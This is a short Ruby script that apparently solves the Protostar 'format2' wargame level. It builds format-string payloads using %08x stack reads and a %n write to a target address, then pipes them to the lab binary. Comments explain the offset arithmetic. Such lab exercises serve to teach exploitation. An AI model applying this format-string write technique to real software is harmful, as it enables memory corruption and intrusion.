#!/usr/bin/ruby

target = "\xe4\x96\x04\x08"
stdin = "XXXX" + ("%08x" * 3) + target + ("%08x" * 4) + "%n"
command = "echo #{stdin} | /opt/protostar/bin/format2"
puts `#{command}`

# same
test = "ABCD" + "%08x|" * 10
command = "echo '#{test}' | /opt/protostar/bin/format2"
puts `#{command}`
# ^result: ABCD00000200|b7fd8420|bffff5e4|44434241|78383025|3830257c|30257c78|257c783....
# as for %60x%4$n :
# %4$n will choose the forth arguments which is 44434241 and we can replace it with 080496e4 
# %60x will print 60 bytes
# the target or the ABCD is 4 bytes
# so 60 + 4 = 64 bytes
# single quotation marks, so echo will not treat $n as a variable
stdin = target + "%60x%4$n"
command = "echo '#{stdin}' | /opt/protostar/bin/format2"
puts `#{command}`
